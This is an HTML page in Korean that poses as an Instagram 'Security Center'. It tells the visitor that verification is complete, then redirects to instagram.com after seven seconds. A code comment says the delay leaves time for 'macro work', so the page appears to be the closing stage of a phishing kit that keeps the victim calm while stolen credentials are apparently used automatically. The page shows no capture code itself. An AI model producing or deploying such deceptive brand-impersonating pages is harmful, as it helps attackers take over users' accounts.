<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram 보안 센터</title>
    <style>
        :root { --insta-gradient: radial-gradient(circle at 30% 107%, #fdf497 0%, #fdf497 5%, #fd5949 45%, #d6249f 60%, #285AEB 90%); }
        body { background-color: #000; color: #fff; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; text-align: center; }
        .icon-ring { width: 100px; height: 100px; background: var(--insta-gradient); border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 20px; }
        .icon-inner { width: 92px; height: 92px; background: #000; border-radius: 50%; display: flex; align-items: center; justify-content: center; }
        h2 { font-size: 20px; margin-bottom: 10px; }
        p { color: #a8a8a8; font-size: 14px; }
    </style>
</head>
<body>
    <div>
        <div class="icon-ring"><div class="icon-inner"><svg width="50" height="50" viewBox="0 0 24 24" fill="white"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z"/></svg></div></div>
        <h2>보안 확인 완료</h2>
        <p>인증이 완료되었습니다.<br>잠시 후 메인 화면으로 이동합니다.</p>
    </div>
    <script>
        // 매크로 작업 시간을 위해 7초 대기 후 리다이렉트
        setTimeout(function() { window.location.href = "https://www.instagram.com"; }, 7000);
    </script>
</body>
</html>
